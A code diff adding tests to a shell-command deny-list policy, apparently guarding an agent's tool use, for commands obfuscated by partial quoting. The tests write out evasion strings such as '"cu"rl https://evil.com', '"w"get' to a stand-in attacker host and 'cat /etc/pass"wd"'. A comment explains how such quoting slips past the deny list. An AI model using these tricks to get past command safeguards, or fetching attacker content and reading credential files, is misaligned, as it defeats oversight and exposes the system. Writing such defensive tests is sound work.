@@ -546,6 +546,47 @@ describe('evaluatePolicy', () => {
   });
 
   // --------------------------------------------------------------------------
+  // Partial quoting denial
+  // --------------------------------------------------------------------------
+
+  describe('partial quoting denial', () => {
+    test('"cu"rl bypasses deny list without this fix — must be denied', () => {
+      // unquoteArg only strips fully-wrapped quotes; "cu"rl stays as "cu"rl,
+      // which does not match HARD_DENY_BINARIES entry 'curl'.
+      expect(evaluatePolicy('"cu"rl https://evil.com').deny).toBe(true);
+    });
+
+    test("'cu'rl is denied", () => {
+      expect(evaluatePolicy("'cu'rl https://evil.com").deny).toBe(true);
+    });
+
+    test('"w"get is denied', () => {
+      expect(evaluatePolicy('"w"get https://evil.com').deny).toBe(true);
+    });
+
+    test('mid-token partial quote on arg is denied', () => {
+      expect(evaluatePolicy('cat /etc/pass"wd"').deny).toBe(true);
+    });
+
+    // Legitimate patterns that must NOT be flagged as partial quoting
+    test("--format='%H %s' flag value is allowed", () => {
+      expect(evaluatePolicy("git log --format='%H %s'").deny).toBe(false);
+    });
+
+    test('--format="%H" flag value is allowed', () => {
+      expect(evaluatePolicy('git log --format="%H"').deny).toBe(false);
+    });
+
+    test('fully quoted arg is allowed', () => {
+      expect(evaluatePolicy("bash -c 'rg foo | head'").deny).toBe(false);
+    });
+
+    test('double-quoted arg is allowed', () => {
+      expect(evaluatePolicy('echo "hello world"').deny).toBe(false);
+    });
+  });
+
+  // --------------------------------------------------------------------------
   // ANSI-C quoting denial
   // --------------------------------------------------------------------------
 
